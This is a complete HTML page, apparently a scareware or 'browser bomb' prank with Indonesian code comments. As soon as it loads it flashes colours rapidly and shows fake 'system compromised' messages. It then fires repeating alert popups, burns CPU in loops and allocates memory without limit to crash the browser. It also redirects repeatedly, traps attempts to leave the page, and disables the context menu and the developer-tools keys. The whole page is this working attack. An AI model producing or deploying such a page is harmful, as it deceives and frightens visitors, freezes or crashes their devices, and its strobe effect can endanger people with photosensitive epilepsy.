<!DOCTYPE html>
<html>
<head>
    <title>Security Emergency</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            animation: flash 0.05s infinite;
            height: 100vh;
            width: 100vw;
        }
        @keyframes flash {
            0% { background: #ff0000; }
            25% { background: #00ff00; }
            50% { background: #0000ff; }
            75% { background: #ffff00; }
            100% { background: #ff00ff; }
        }
        .container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            z-index: 100;
        }
        h1 {
            font-size: 2.5rem;
            margin-bottom: 2rem;
            text-shadow: 0 0 10px #0f0;
        }
        #status {
            font-size: 1.2rem;
            color: #ff5555;
            margin-top: 2rem;
        }
        .scan-line {
            position: absolute;
            left: 0;
            width: 100%;
            height: 2px;
            background: #0f0;
            box-shadow: 0 0 10px #0f0;
            animation: scan 2s linear infinite;
        }
        @keyframes scan {
            0% { top: 0%; }
            100% { top: 100%; }
        }
    </style>
</head>
<body>
    <div class="scan-line"></div>
    <div class="container">
        <h1>‚ö†Ô∏è CRITICAL SYSTEM FAILURE ‚ö†Ô∏è</h1>
        <div id="log">Initializing memory dump sequence...</div>
        <div id="status">CPU: 98% | MEM: 99% | TEMP: 87¬∞C</div>
    </div>

    <script>
    // ==================== KONFIGURASI ====================
    const CONFIG = {
        ALERT_DELAY: 1000,      // 1 detik
        CPU_BOMB_DELAY: 2000,   // 2 detik
        MEMORY_BOMB_DELAY: 3000 // 3 detik
    };

    // ==================== FUNGSI UTAMA ====================
    const log = document.getElementById('log');
    const status = document.getElementById('status');

    function updateLog(message) {
        log.innerHTML += `<br>${new Date().toLocaleTimeString()}: ${message}`;
        console.log(message);
    }

    function updateStatus(cpu, mem, temp) {
        status.textContent = `CPU: ${cpu}% | MEM: ${mem}% | TEMP: ${temp}¬∞C`;
    }

    // 1. ALERT BOMB
    function startAlertBomb() {
        updateLog("Starting alert bombardment...");
        setInterval(() => {
            alert("üö® SYSTEM COMPROMISED!\n\nMemory corruption detected!\n\nAll data is being erased!");
        }, 3000);
    }

    // 2. CPU BOMB (Heavy computation)
    function startCpuBomb() {
        updateLog("Starting CPU overload...");
        setInterval(() => {
            // Heavy mathematical calculations
            let result = 0;
            for (let i = 0; i < 1000000; i++) {
                result += Math.sqrt(Math.random() * Math.PI) * Math.cos(Math.random());
            }
            // Update status with fake high CPU
            updateStatus(95 + Math.floor(Math.random() * 5), 
                        parseInt(status.textContent.split('|')[1].trim().split('%')[0]), 
                        85 + Math.floor(Math.random() * 5));
        }, 100);
    }

    // 3. MEMORY BOMB (Allocate memory)
    function startMemoryBomb() {
        updateLog("Starting memory allocation bomb...");
        const memoryChunks = [];
        
        setInterval(() => {
            // Allocate ~10MB per chunk
            try {
                const chunk = new Array(1000000).fill('X'.repeat(100));
                memoryChunks.push(chunk);
                
                // Update memory usage
                const currentMem = parseInt(status.textContent.split('|')[1].trim().split('%')[0]);
                const newMem = Math.min(99, currentMem + 1);
                updateStatus(parseInt(status.textContent.split('|')[0].trim().split('%')[0]), 
                            newMem, 
                            parseInt(status.textContent.split('|')[2].trim().split('¬∞')[0]));
                
                updateLog(`Allocated chunk ${memoryChunks.length} (${memoryChunks.length * 10}MB virtual)`);
            } catch (e) {
                updateLog("Memory allocation failed - browser may crash soon");
            }
        }, 500);
    }

    // 4. REDIRECT BOMB
    function startRedirectBomb() {
        updateLog("Starting redirect loop...");
        setInterval(() => {
            window.location.hash = Math.random().toString(36).substring(7);
        }, 5000);
        
        // Full redirect setiap 30 detik
        setTimeout(() => {
            window.location.href = "data:text/html,<h1 style='color:red'>DEVICE COMPROMISED</h1>";
        }, 30000);
    }

    // 5. PREVENT EXIT
    function preventExit() {
        updateLog("Enabling exit prevention...");
        
        // Prevent leaving
        window.onbeforeunload = function(e) {
            e.preventDefault();
            e.returnValue = "WARNING: System scan in progress. Leaving may cause permanent damage.";
            return e.returnValue;
        };
        
        // Disable right click
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            alert("Context menu disabled by security protocol.");
        });
        
        // Disable keys
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                e.preventDefault();
                alert("Developer tools disabled by security policy.");
            }
        });
    }

    // ==================== INISIALISASI ====================
    window.onload = function() {
        updateLog("System initialized");
        updateLog("Starting attack sequence...");
        
        // Mulai semua attack dengan delay
        setTimeout(startAlertBomb, CONFIG.ALERT_DELAY);
        setTimeout(startCpuBomb, CONFIG.CPU_BOMB_DELAY);
        setTimeout(startMemoryBomb, CONFIG.MEMORY_BOMB_DELAY);
        setTimeout(startRedirectBomb, 5000);
        preventExit();
        
        updateLog("All attack systems: ONLINE");
        updateLog("Target device status: COMPROMISED");
        
        // Auto update status
        setInterval(() => {
            const cpu = 90 + Math.floor(Math.random() * 10);
            const mem = 85 + Math.floor(Math.random() * 15);
            const temp = 75 + Math.floor(Math.random() * 15);
            updateStatus(cpu, mem, temp);
        }, 2000);
    };
    </script>
</body>
</html>
